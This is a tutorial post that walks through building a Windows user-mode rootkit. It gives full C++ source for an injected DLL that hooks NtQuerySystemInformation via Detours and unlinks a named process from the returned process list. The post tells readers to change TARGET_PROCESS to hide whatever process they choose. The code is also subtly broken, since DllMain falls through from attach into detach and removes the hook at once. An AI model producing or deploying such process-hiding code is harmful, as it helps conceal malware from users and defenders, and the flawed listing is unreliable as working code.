## How does user mode rootkit work?
A user-mode rootkit typically works by injecting a DLL (Dynamic Link Library) into the target process, hooking the APIs that the process calls, and removing specific information from the actual return values.
Rootkits mainly hide information about processes, network activity, files, the registry, etc., to avoid detection.

## How to hide process information?
The `NtQuerySystemInformation` API is a Windows native API that returns information about the processes present on the system.

```cpp
__kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);
```

```cpp
NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
```

`SystemInformation` (of type PVOID) returns information about processes.
You can cast it to the existing `PSYSTEM_PROCESS_INFORMATION` type and, from each process entry, read the process name via `ImageName.Buffer` (a `PWCHAR` inside a `UNICODE_STRING`).
Using that, you can filter out specific process names from the process list and return the filtered result.
So when a DLL-injected process calls `NtQuerySystemInformation`, it will not see those filtered process names.

## How to hook a function?
The `Detours` library is a Windows library that enables hooking specific functions. Using it, you can hook native APIs and modify their results or record (log) them.

```bash
vcpkg install detours
vcpkg integrate install
```

Using the `vcpkg` tool, you can automatically include C++ header files and library files in `Visual Studio 2022`. In the case of `Detours`, the header file is located at `detours/detours.h`.

```cpp
#include <detours/detours.h>
```

## How to make a user mode rootkit?
The completed DLL source code is as follows:

```cpp
#include "pch.h"
#include <detours/detours.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>

#pragma comment(lib, "detours.lib")

using namespace std;

const wchar_t* TARGET_PROCESS = L"Notepad.exe";

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
static NtQuerySystemInformation_t _NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
    GetModuleHandle(L"ntdll.dll"),
    "NtQuerySystemInformation"
);

NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS result = _NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    if (SystemInformationClass == 5 && result == 0 && SystemInformation != nullptr) {
        PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prevInfo = nullptr;
        while (processInfo->NextEntryOffset || processInfo->UniqueProcessId) {
            bool hidden = false;
            if (processInfo->ImageName.Buffer != nullptr &&
                _wcsicmp(processInfo->ImageName.Buffer, TARGET_PROCESS) == 0) {
                hidden = true;
            }

            if (hidden && prevInfo != nullptr) {
                if (processInfo->NextEntryOffset == 0) {
                    prevInfo->NextEntryOffset = 0;
                }
                else {
                    prevInfo->NextEntryOffset += processInfo->NextEntryOffset;
                }
            }
            else {
                prevInfo = processInfo;
            }

            if (processInfo->NextEntryOffset == 0) break;
            processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
    }

    return result;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)_NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
        DetourTransactionCommit();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)_NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
        DetourTransactionCommit();
    }
    return TRUE;
}
```

The code iterates through the process information using `NextEntryOffset` when handling the hooked function. It compares `ImageName.Buffer` with the target process name, and if they match, it manipulates `NextEntryOffset` to remove the entry from the list so it links directly to the next process. (Current target process name is `Notepad.exe`. Change the `TARGET_PROCESS` value to set the target process to hide)

## Conclusion
In conclusion, the user-mode rootkit is injected into the target process as a DLL. After injection it hooks `NtQuerySystemInformation`, examines `ImageName.Buffer` in the `PSYSTEM_PROCESS_INFORMATION` structure, and if it matches a process that should be hidden, it modifies `NextEntryOffset` to remove that process from the list and link directly to the next entry to prevent the process from being seen.
